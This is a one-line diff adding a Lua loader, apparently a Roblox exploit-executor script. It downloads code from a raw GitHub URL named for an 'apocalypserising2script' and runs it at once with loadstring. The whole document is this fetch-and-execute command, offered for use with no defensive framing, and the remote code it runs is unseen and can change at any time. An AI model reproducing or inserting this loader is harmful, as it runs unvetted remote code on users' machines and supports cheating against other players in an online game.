@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KrafiqScripter/apocalypserising2script/refs/heads/main/apocalypserising2script"))()
